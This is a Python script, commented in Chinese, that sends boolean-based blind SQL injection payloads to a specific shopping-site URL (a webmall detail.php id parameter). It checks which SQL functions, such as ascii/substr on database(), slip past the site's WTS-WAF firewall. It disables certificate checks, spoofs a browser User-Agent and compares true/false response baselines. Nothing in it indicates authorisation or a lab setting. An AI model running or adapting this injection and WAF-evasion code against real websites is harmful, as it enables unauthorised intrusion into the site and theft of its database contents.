#!/usr/bin/env python3
"""yijing_blind_test.py - 测试布尔盲注函数是否被WAF拦"""
import urllib.request, urllib.parse, ssl, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        b = r.read(60000).decode('utf-8','ignore')
        return len(b), 'WAF' if 'WTS-WAF' in b else 'OK'
    except urllib.error.HTTPError as e:
        b = e.read(60000).decode('utf-8','ignore')
        return len(b), 'WAF' if 'WTS-WAF' in b else 'HTTP%d'%e.code
    except Exception as e:
        return 0, 'ERR'

funcs = [
    'ascii(substr(database(),1,1))',
    'ord(mid(database(),1,1))',
    'ascii(left(database(),1))',
    'ascii(substring(database(),1,1))',
    'ascii(database())',
    'length(database())',
]

# 先测真/假基线
print('基线: 真=%s 假=%s' % (q("687' and if(1=1,687,0)-- "), q("687' and if(1=2,687,0)-- ")))

for f in funcs:
    # 测试函数是否被拦: if(f>100,...) 和 if(f<200,...) 应该一个真一个假
    r1 = q("687' and if(%s>100,687,0)-- " % f)
    r2 = q("687' and if(%s<200,687,0)-- " % f)
    print('%s -> >100:%s  <200:%s' % (f, r1, r2))
